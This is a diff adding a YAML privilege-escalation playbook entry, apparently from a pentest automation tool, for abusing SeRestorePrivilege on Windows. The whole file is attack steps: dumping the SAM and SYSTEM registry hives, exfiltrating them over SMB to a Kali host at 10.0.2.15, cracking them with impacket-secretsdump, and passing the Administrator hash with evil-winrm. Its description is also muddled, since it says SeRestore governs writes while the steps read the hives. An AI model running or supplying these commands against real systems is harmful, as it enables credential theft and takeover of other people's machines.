@@ -1,0 +1,41 @@
+chain_id: serestore_dump_sam
+title: "Windows privesc — SeRestorePrivilege to write any file (SAM/SYSTEM dump)"
+severity: CRITICAL
+tags: [windows, privesc, serestore, sam, registry]
+
+trigger:
+  any_of:
+    - { kind: "windows-privilege", banner_pattern: "(?i)SeRestorePrivilege" }
+
+description: |
+  SeRestorePrivilege bypasses ACLs on file *write* operations. The
+  classic abuse mirrors SeBackup: read SAM/SYSTEM hive snapshots and
+  exfiltrate, then run secretsdump locally to PtH the local
+  Administrator hash.
+
+steps:
+  - id: 1
+    title: "Save the registry hives (SeRestore allows the restore-from-file primitive)"
+    command: |
+      reg save HKLM\SAM C:\Users\Public\sam.save
+      reg save HKLM\SYSTEM C:\Users\Public\system.save
+
+  - id: 2
+    title: "Exfiltrate to Kali via SMB"
+    command: |
+      # Kali:
+      impacket-smbserver share . -smb2support
+      # Windows:
+      copy C:\Users\Public\sam.save \\10.0.2.15\share\
+      copy C:\Users\Public\system.save \\10.0.2.15\share\
+
+  - id: 3
+    title: "secretsdump locally"
+    command: impacket-secretsdump -sam sam.save -system system.save LOCAL
+
+  - id: 4
+    title: "Pass-the-Hash with the recovered Administrator NT hash"
+    command: evil-winrm -i $VICTIMA -u Administrator -H <NThash>
+
+references:
+  - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/serestoreprivilege
